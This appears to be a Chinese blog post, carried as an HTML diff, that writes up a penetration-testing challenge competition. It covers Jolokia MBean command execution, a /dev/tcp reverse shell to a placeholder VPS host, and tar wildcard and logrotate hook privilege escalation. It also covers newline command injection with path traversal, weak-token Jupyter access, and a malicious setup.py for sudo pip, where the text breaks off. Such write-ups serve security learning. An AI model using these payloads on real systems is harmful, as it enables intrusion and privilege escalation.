+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-破阵阁-渗透实战挑战赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-06-13T07:04:52.000Z" itemprop="datePublished">2026-06-13</time>
+    <time style="display: none;" id="post-update-time">2026-06-14</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="404号节点"><a class="markdownIt-Anchor" href="#404号节点"></a> 404号节点</h2>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613150533089.png" alt="image-20260613150533089" /></p>
+<h3 id="jolokia-rce"><a class="markdownIt-Anchor" href="#jolokia-rce"></a> Jolokia RCE</h3>
+<p>目录扫描发现<code>/actuator</code>泄露</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613150931263.png" alt="image-20260613150931263" /></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151051376.png" alt="image-20260613151051376" /></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151328599.png" alt="image-20260613151328599" /></p>
+<p>访问<code>/actuator/jolokia/list</code>找出能利用的MBean</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151415485.png" alt="image-20260613151415485" /></p>
+<p>给ai分析得到一个自定义的Bean:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;com.example&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type=Diagnostics&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;op&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;runDiagnostic&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;command&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ret&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;desc&quot;</span><span class="punctuation">:</span><span class="string">&quot;Execute system diagnostic command&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.demo.DiagnosticsMBean&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这个 MBean 的 <code>runDiagnostic</code> 操作接收一个 <code>command</code> 字符串参数，描述是 <strong>“Execute system diagnostic command”</strong>。</p>
+<p><strong>这意味着可以通过 Jolokia 直接执行任意系统命令。</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://175.27.169.122:64259/actuator/jolokia/exec/com.example:type=Diagnostics/runDiagnostic</span><br><span class="line"></span><br><span class="line"><span class="attribute">POST</span>:</span><br><span class="line">&#123;&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;com.example:type=Diagnostics&quot;,&quot;operation&quot;:&quot;runDiagnostic&quot;,&quot;arguments&quot;:[&quot;id&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151521078.png" alt="image-20260613151521078" /></p>
+<p>成功getshell</p>
+<p>但是是www权限，需要提权</p>
+<p>先反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;com.example:type=Diagnostics&quot;,&quot;operation&quot;:&quot;runDiagnostic&quot;,&quot;arguments&quot;:[&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/VPS/9999 0&gt;&amp;1&#x27;&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>但失败了，不出网</p>
+<p>那只能在这上面执行命令提权了</p>
+<h3 id="定时任务tar通配符提权至sysadmin"><a class="markdownIt-Anchor" href="#定时任务tar通配符提权至sysadmin"></a> 定时任务tar通配符提权至sysadmin</h3>
+<p>找suid权限命令：<br />
+<img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613153945944.png" alt="image-20260613153945944" /></p>
+<p><a target="_blank" rel="noopener" href="http://xn--sudo-k84fuit57a6i8d.ws">发现一个sudo.ws</a>，是个elf可执行文件</p>
+<p>原始sudo需要密码</p>
+<p>继续查询定时任务</p>
+<p>在<code>/etc/cron.d/sysadmin-backup</code>中发现</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613160116495.png" alt="image-20260613160116495" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * sysadmin cd /var/backups/web &amp;&amp; tar czf /var/backups/web/backup.tar.gz *</span><br></pre></td></tr></table></figure>
+<p>每分钟以 sysadmin 身份运行 tar，而目标目录 <code>/var/backups/web/</code> 是全局可写的，所以可以通过 tar<br />
+通配符注入来劫持执行</p>
+<p><strong>先清理目标目录中的旧文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/backups/web &amp;&amp; rm -f ./-* ./*.sh</span><br></pre></td></tr></table></figure>
+<p><strong>编写枚举载荷 <a target="_blank" rel="noopener" href="http://p.sh">p.sh</a></strong>:用sysadmin权限来信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;exec&quot;,&quot;mbean&quot;:&quot;com.example:type=Diagnostics&quot;,&quot;operation&quot;:&quot;runDiagnostic&quot;,&quot;arguments&quot;:[&quot;echo &#x27;#!/bin/sh&#x27; &gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;id&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;/usr/bin/sudo.ws -l 2&gt;&amp;1&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;/usr/bin/sudo.ws -v 2&gt;&amp;1&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;cat /etc/sudoers 2&gt;&amp;1&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;ls -la /etc/sudoers.d/ 2&gt;&amp;1&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;ls -la /root/ 2&gt;&amp;1&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; echo &#x27;find / -writable -name flag* 2&gt;/dev/null&#x27; &gt;&gt; /var/backups/web/p.sh &amp;&amp; chmod +x /var/backups/web/p.sh&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">命令</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>id</code></td>
+<td style="text-align:left">查看当前用户和组</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>sudo.ws -l</code></td>
+<td style="text-align:left">查看 sudo 权限</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>sudo.ws -v</code></td>
+<td style="text-align:left">验证 sudo 权限</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>cat /etc/sudoers</code></td>
+<td style="text-align:left">查看 sudo 配置</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>ls -la /etc/sudoers.d/</code></td>
+<td style="text-align:left">查看 sudo 附加配置</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>ls -la /root/</code></td>
+<td style="text-align:left">查看 root 目录（提权目标）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>find / -writable -name flag*</code></td>
+<td style="text-align:left">查找可写的 flag 文件</td>
+</tr>
+</tbody>
+</table>
+<p><strong>放置 checkpoint 文件</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http<span class="punctuation">:</span><span class="comment">//175.27.169.122:64259/actuator/jolokia/exec/com.example:type=Diagnostics/runDiagnostic -H &quot;Content-Type: application/json&quot; -d &quot;&#123;\&quot;type\&quot;:\&quot;exec\&quot;,\&quot;mbean\&quot;:\&quot;com.example:type=Diagnostics\&quot;,\&quot;operation\&quot;:\&quot;runDiagnostic\&quot;,\&quot;arguments\&quot;:[\&quot;cd /var/backups/web &amp;&amp; touch -- --checkpoint=1 &amp;&amp; touch -- --checkpoint-action=exec=sh\\\\ p.sh &amp;&amp; ls -la\&quot;]&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613162140129.png" alt="image-20260613162140129" /></p>
+<p>成功创建了两个 checkpoint 文件：</p>
+<ul>
+<li><code>--checkpoint=1 </code>  启用 checkpoint 功能</li>
+<li><code>--checkpoint-action=exec=sh p.sh </code> 在 checkpoint 时执行命令</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">展开后 tar 实际看到的是：</span><br><span class="line">  tar czf backup.tar.gz --checkpoint-action=exec=sh p.sh --checkpoint=1 backup.tar.gz p.sh</span><br><span class="line">                          ↑ 被当成选项                        ↑ 被当成选项    ↑ 正常文件</span><br><span class="line"></span><br><span class="line">  tar 解析流程：</span><br><span class="line">  1. --checkpoint-action=exec=sh p.sh → 设置动作为 &quot;检查点触发时执行 sh p.sh&quot;</span><br><span class="line">  2. --checkpoint=1 → 每 1 个文件触发检查点</span><br><span class="line">  3. 处理 p.sh 时触发检查点 → 以 sysadmin 身份执行 sh p.sh</span><br></pre></td></tr></table></figure>
+<p><strong>等 65 秒让 cron 触发，然后读取结果</strong></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper</span><br><span class="line">sudo: a password is required</span><br><span class="line">uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>sysadmin</code> 是一个普通用户（UID 1001）</li>
+<li><strong>没有 sudo 权限</strong>（需要密码）</li>
+<li>只有一个主组，没有附加权限</li>
+</ul>
+<h3 id="sudoperf-stat提权至root"><a class="markdownIt-Anchor" href="#sudoperf-stat提权至root"></a> sudo+perf stat提权至root</h3>
+<p>初次尝试 <code>sudo.ws cat /flag-hjmw</code> 失败，提示需要密码。但发现系统存在 perf 工具</p>
+<p>而sysadmin用户可以免密执行perf:<br />
+<img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614154149658.png" alt="image-20260614154149658" /></p>
+<p><strong>perf stat 提权原理：</strong> perf stat 是 Linux 性能分析工具，它的设计就是执行一个命令并统计其性能指标。用法 <code>perf stat   &lt;command&gt; </code>会以当前有效用户身份运行 <code>&lt;command&gt;</code>。如果通过 <a target="_blank" rel="noopener" href="http://sudo.ws">sudo.ws</a> 以 root 执行 perf stat，那么 perf stat内部执行的命令也是 root 身份。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GTFOBins 收录了 perf 的 sudo 提权用法：</span><br><span class="line">  sudo perf stat /bin/sh    → 获得 root shell</span><br><span class="line">  sudo perf exec -- /bin/sh → 同样效果（较新版本）</span><br></pre></td></tr></table></figure>
+<p>命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo.ws /usr/bin/perf stat -o /dev/null cat /flag-hjmw &gt; /tmp/flag.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://xn--p-n27azb2hs74c.sh">将其写入p.sh</a>:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/bin/sudo.ws /usr/bin/perf <span class="built_in">stat</span> -o /dev/null <span class="built_in">cat</span> /flag-hjmw &gt; /tmp/flag.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>等待定时任务执行</p>
+<p>读取<code>/tmp/flag.txt</code></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613164848377.png" alt="image-20260613164848377" /></p>
+<h2 id="日志审计系统"><a class="markdownIt-Anchor" href="#日志审计系统"></a> 日志审计系统</h2>
+<h3 id="换行命令注入"><a class="markdownIt-Anchor" href="#换行命令注入"></a> 换行命令注入</h3>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165513491.png" alt="image-20260613165513491" /></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165524927.png" alt="image-20260613165524927" /></p>
+<p>存在任意文件读取</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165621356.png" alt="image-20260613165621356" /></p>
+<p>发现服务器使用 cat 命令读取文件，路径被拼接到 /var/log/app/ 后面，猜测存在换行命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=../../../../etc/passwd%0als%20/</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165830477.png" alt="image-20260613165830477" /></p>
+<p>得到flag文件名：<code>flag-j24l</code></p>
+<p>读取显示权限不足</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165942427.png" alt="image-20260613165942427" /></p>
+<h3 id="logrotate-提权利用"><a class="markdownIt-Anchor" href="#logrotate-提权利用"></a> Logrotate 提权利用</h3>
+<p>当前是appuser用户</p>
+<p>查看进程列表：<code>ps+auxps+aux</code></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170400116.png" alt="image-20260613170400116" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 appuser   0:00 /app/server</span><br><span class="line">   17 root      0:00 /bin/sh -c      while true; do         sleep 15         echo &quot;[$(date)] logrotate triggered&quot; &gt;&gt; /var/log/app/logrotate.log         /usr/sbin/logrotate -f /etc/logrotate.d/app     done </span><br><span class="line">  883 root      0:00 sleep 15</span><br><span class="line">  884 appuser   0:00 ps aux</span><br></pre></td></tr></table></figure>
+<p>发现PID 17 是一个 root 权限的 shell 循环</p>
+<p>每 15 秒执行一次 logrotate</p>
+<p><strong>查看 logrotate 配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=%0Acat+/etc/logrotate.d/app</span><br></pre></td></tr></table></figure>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170559565.png" alt="image-20260613170559565" /></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/var/log/app/*.log &#123;</span><br><span class="line">    su root root</span><br><span class="line">    rotate 5</span><br><span class="line">    daily</span><br><span class="line">    compress</span><br><span class="line">    prerotate</span><br><span class="line">        if <span class="section">[ -f /var/log/app/.hook.sh ]</span><span class="comment">; then</span></span><br><span class="line">            /bin/sh /var/log/app/.hook.sh</span><br><span class="line">        fi</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>su root root</code> → logrotate 以 root 身份运行</li>
+<li><code>prerotate</code> 钩子会执行 <code>/var/log/app/.hook.sh</code></li>
+<li><code>/var/log/app/</code> 目录对 appuser 可写</li>
+</ul>
+<p><strong>写入恶意 hook 脚本</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 --data-urlencode 确保换行符正确传递</span></span><br><span class="line">curl -s -X POST http://175.27.169.122:17306/logs \</span><br><span class="line">--data-urlencode &#x27;file=app.log </span><br><span class="line">printf &quot;cat /flag-j24l &gt; /var/log/app/flag.txt&quot; &gt; /var/log/app/.hook.sh&#x27;</span><br></pre></td></tr></table></figure>
+<p>将<code>cat /flag-j24l &gt; /var/log/app/flag.txt</code>写入hook脚本中</p>
+<p>logrotate 每 15 秒执行一次，prerotate 钩子会以 root 权限执行我们的脚本</p>
+<p>读取flag:<code>file=%0Acat+/var/log/app/flag.txt</code></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170855761.png" alt="image-20260613170855761" /></p>
+<h2 id="默认配置"><a class="markdownIt-Anchor" href="#默认配置"></a> 默认配置</h2>
+<h3 id="jupyter"><a class="markdownIt-Anchor" href="#jupyter"></a> jupyter</h3>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171135986.png" alt="image-20260613171135986" /></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171143158.png" alt="image-20260613171143158" /></p>
+<p>目录扫描：<br />
+<img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171830241.png" alt="image-20260613171830241" /></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172000597.png" alt="image-20260613172000597" /></p>
+<p>发现是jupyter2.8.0版本</p>
+<p>但这里没有未授权，只能从token入手</p>
+<p>进行爆破，弱口令得到<code>jupyter</code></p>
+<p>成功进入</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172401880.png" alt="image-20260613172401880" /></p>
+<p>访问<code>/api/terminals?token=jupyter</code>创建终端</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172506392.png" alt="image-20260613172506392" /></p>
+<p>通过 WebSocket 连接到终端 <code>ws://175.27.169.122:37170/terminals/websocket/1?token=jupyter</code></p>
+<p>脚本：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">ws, message</span>):</span><br><span class="line">    <span class="built_in">print</span>(message, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_error</span>(<span class="params">ws, error</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;error&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_close</span>(<span class="params">ws, close_status_code, close_msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connection closed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_open</span>(<span class="params">ws</span>):</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    ws.send(<span class="string">&quot;id\n&quot;</span>)</span><br><span class="line">    ws.send(<span class="string">&quot;ls -la /\n&quot;</span>)</span><br><span class="line">    ws.send(<span class="string">&quot;sudo -l\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ws_url = <span class="string">&quot;ws://175.27.169.122:37170/terminals/websocket/1?token=jupyter&quot;</span></span><br><span class="line">    websocket.enableTrace(<span class="literal">False</span>)</span><br><span class="line">    ws = websocket.WebSocketApp(ws_url,</span><br><span class="line">                                on_open=on_open,</span><br><span class="line">                                on_message=on_message,</span><br><span class="line">                                on_error=on_error,</span><br><span class="line">                                on_close=on_close)</span><br><span class="line">    ws.run_forever()</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">uid=1000(jovyan) gid=100(<span class="built_in">users</span>) <span class="built_in">groups</span>=100(<span class="built_in">users</span>),1000(jovyan)</span></span><br></pre></td></tr></table></figure>
+<p>成功getshell</p>
+<p>但需要进行提权</p>
+<h3 id="sudo提权-pip"><a class="markdownIt-Anchor" href="#sudo提权-pip"></a> SUDO提权-pip</h3>
+<p><code>sudo</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for jovyan on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jovyan may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /opt/conda/bin/pip</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户 <code>jovyan</code> 可以<strong>无密码</strong>以root身份执行 <code>/opt/conda/bin/pip</code></li>
+<li>pip安装包时可以执行任意Python代码（<a target="_blank" rel="noopener" href="http://xn--setup-3w3pes.py">通过setup.py</a>）</li>
+</ul>
+<p><strong>创建恶意Python包</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建包目录</span></span><br><span class="line">mkdir -p /tmp/pwn_pkg</span><br><span class="line">cd /tmp/pwn_pkg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建setup.py - pip安装时会以root执行</span></span><br><span class="line">cat &gt; setup.py &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以root身份执行的代码</span></span><br><span class="line">os.system(<span 